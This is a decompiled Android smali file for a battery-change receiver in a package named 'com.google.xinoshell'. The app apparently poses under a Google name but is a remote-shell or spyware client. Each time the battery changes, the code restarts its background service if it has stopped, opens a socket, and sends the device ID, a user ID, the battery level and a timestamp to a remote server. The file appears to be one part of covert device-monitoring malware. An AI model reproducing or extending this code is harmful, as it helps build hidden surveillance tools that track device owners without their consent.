.class public Lcom/google/xinoshell/receivers/BatteryLevelReceiver;
.super Landroid/content/BroadcastReceiver;
.source "BatteryLevelReceiver.java"


# static fields
.field private static previousBatteryValue:Ljava/lang/String;


# instance fields
.field private manageSocket:Lcom/google/xinoshell/connection/ManageSocket;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 22
    const/4 v0, 0x0

    sput-object v0, Lcom/google/xinoshell/receivers/BatteryLevelReceiver;->previousBatteryValue:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 21
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 7
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .line 27
    const-class v0, Lcom/google/xinoshell/services/BgService;

    invoke-static {p1, v0}, Lcom/google/xinoshell/utils/ServiceUtil;->isServiceRunning(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 29
    nop

    .line 30
    :try_start_0
    const-class v0, Lcom/google/xinoshell/services/BgService;

    invoke-static {p1, v0}, Lcom/google/xinoshell/utils/ServiceUtil;->isServiceRunning(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 31
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/google/xinoshell/services/BgService;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 32
    .local v0, "serviceIntent":Landroid/content/Intent;
    invoke-virtual {p1, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 33
    nop

    .line 39
    .end local v0    # "serviceIntent":Landroid/content/Intent;
    :cond_0
    goto :goto_0

    .line 37
    :catch_0
    move-exception v0

    .line 38
    .local v0, "err":Ljava/lang/Exception;
    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    .line 42
    .end local v0    # "err":Ljava/lang/Exception;
    :cond_1
    :goto_0
    invoke-static {p1}, Lcom/google/xinoshell/utils/NetworkUtil;->isNetworkConnected(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_5

    .line 43
    invoke-static {p1}, Lcom/google/xinoshell/connection/ManageSocket;->getInstance(Landroid/content/Context;)Lcom/google/xinoshell/connection/ManageSocket;

    move-result-object v0

    iput-object v0, p0, Lcom/google/xinoshell/receivers/BatteryLevelReceiver;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    .line 44
    iget-object v0, p0, Lcom/google/xinoshell/receivers/BatteryLevelReceiver;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    invoke-virtual {v0}, Lcom/google/xinoshell/connection/ManageSocket;->connect()V

    .line 47
    if-eqz p2, :cond_4

    :try_start_1
    const-string v0, "android.intent.action.BATTERY_CHANGED"

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 48
    const-string v0, "level"

    const/4 v1, -0x1

    invoke-virtual {p2, v0, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    .line 49
    .local v0, "level":I
    const-string v2, "scale"

    invoke-virtual {p2, v2, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v2

    .line 50
    .local v2, "scale":I
    if-eq v0, v1, :cond_4

    if-eq v2, v1, :cond_4

    .line 51
    int-to-float v1, v0

    int-to-float v3, v2

    div-float/2addr v1, v3

    const/high16 v3, 0x42c80000    # 100.0f

    mul-float/2addr v1, v3

    float-to-int v1, v1

    .line 52
    .local v1, "batteryPercentage":I
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "%"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 54
    .local v3, "currentBatteryValue":Ljava/lang/String;
    sget-object v4, Lcom/google/xinoshell/receivers/BatteryLevelReceiver;->previousBatteryValue:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    .line 55
    return-void

    .line 58
    :cond_2
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 59
    .local v4, "batteryData":Lorg/json/JSONObject;
    const-string v5, "DeviceId"

    invoke-static {p1}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getDeviceID(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 60
    const-string v5, "UserId"

    sget-object v6, Lcom/google/xinoshell/utils/Config;->userID:Ljava/lang/String;

    invoke-virtual {v4, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 61
    const-string v5, "battery_Level"

    invoke-virtual {v4, v5, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 62
    const-string v5, "timestamp"

    new-instance v6, Ljava/util/Date;

    invoke-direct {v6}, Ljava/util/Date;-><init>()V

    invoke-virtual {v6}, Ljava/util/Date;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 64
    iget-object v5, p0, Lcom/google/xinoshell/receivers/BatteryLevelReceiver;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    invoke-virtual {v5}, Lcom/google/xinoshell/connection/ManageSocket;->isConnected()Z

    move-result v5

    if-eqz v5, :cond_3

    .line 65
    iget-object v5, p0, Lcom/google/xinoshell/receivers/BatteryLevelReceiver;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    const-string v6, "battery_level_Changed"

    invoke-virtual {v5, v6, v4}, Lcom/google/xinoshell/connection/ManageSocket;->send(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 68
    :cond_3
    sput-object v3, Lcom/google/xinoshell/receivers/BatteryLevelReceiver;->previousBatteryValue:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    .line 72
    .end local v0    # "level":I
    .end local v1    # "batteryPercentage":I
    .end local v2    # "scale":I
    .end local v3    # "currentBatteryValue":Ljava/lang/String;
    .end local v4    # "batteryData":Lorg/json/JSONObject;
    :catch_1
    move-exception v0

    .line 73
    .local v0, "err":Ljava/lang/Exception;
    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    .line 74
    .end local v0    # "err":Ljava/lang/Exception;
    :cond_4
    :goto_1
    nop

    .line 77
    :cond_5
    return-void
.end method
